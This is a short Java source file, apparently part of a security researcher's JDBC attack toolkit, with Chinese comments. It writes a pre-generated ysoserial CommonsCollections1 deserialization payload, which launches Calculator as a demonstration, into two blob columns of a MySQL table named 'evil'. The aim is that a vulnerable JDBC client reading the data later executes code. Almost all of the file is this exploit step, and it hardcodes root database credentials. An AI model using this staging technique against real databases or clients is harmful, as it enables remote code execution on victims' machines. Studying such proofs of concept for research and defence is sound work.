package org.su18.jdbc.attack.mysql;

import java.io.File;
import java.io.FileInputStream;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;

/**
 * 向构造的数据表中插入恶意反序列化数据
 *
 * @author su18
 */
public class InsertData {

	public static void main(String[] args) throws Exception {

		String CLASS_NAME = "com.mysql.jdbc.Driver";
		String URL        = "jdbc:mysql://localhost:3306/test";
		String USERNAME   = "root";
		String PASSWORD   = "12s33dvc";

		Class.forName(CLASS_NAME);
		Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);

		// 事先生成的 CC1 链，执行 open -a Calculator.app
		File file   = new File("/Users/phoebe/IdeaProjects/ysoserial-su18/URLDNS3.bin");
		int  length = (int) file.length();

		// 在 1 和 3 都插入恶意代码，用来兼容两种触发情况
		FileInputStream stream1 = new FileInputStream(file);
		FileInputStream stream2 = new FileInputStream(file);

		// 确保表中至少有三个字段，恶意数据写在第三个字段中
		PreparedStatement statement = connection.prepareStatement("INSERT INTO evil (`a`,`b`,`c`) VALUES (?,1,?)");
		// 使用 setBlob 直接写入
		statement.setBlob(1, stream1, length);
		statement.setBlob(2, stream2, length);
		statement.execute();

		statement.close();
		connection.close();
	}
}
